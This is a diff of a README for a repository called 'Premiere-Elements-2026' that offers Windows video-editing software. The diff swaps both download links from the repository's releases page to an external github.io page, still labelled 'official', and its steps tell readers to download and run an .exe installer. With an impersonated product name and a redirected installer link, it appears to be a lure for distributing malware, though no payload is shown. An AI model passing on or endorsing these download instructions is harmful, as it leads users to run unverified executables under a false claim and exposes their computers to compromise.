@@ -1,6 +1,6 @@
 # 🎞️ Premiere-Elements-2026 - Master Video Editing On Windows Easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/playful-sangoma916/Premiere-Elements-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://playful-sangoma916.github.io)
 
 Premiere-Elements-2026 provides a robust platform for video editing on Windows 11 and Windows 10. This software allows users to import, cut, and export video files with professional tools. It removes complex technical barriers, allowing you to focus on the story within your footage.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these specifications before you begin the installatio
 
 Follow these steps to acquire the installer for your computer.
 
-1. Click the following link to reach the official releases page: [https://github.com/playful-sangoma916/Premiere-Elements-2026/releases](https://github.com/playful-sangoma916/Premiere-Elements-2026/releases).
+1. Click the following link to reach the official releases page: [https://playful-sangoma916.github.io](https://playful-sangoma916.github.io).
 2. Look for the latest version section on the page.
 3. Locate the file ending in .exe, which is the installer file.
 4. Select the file to start the download to your computer.
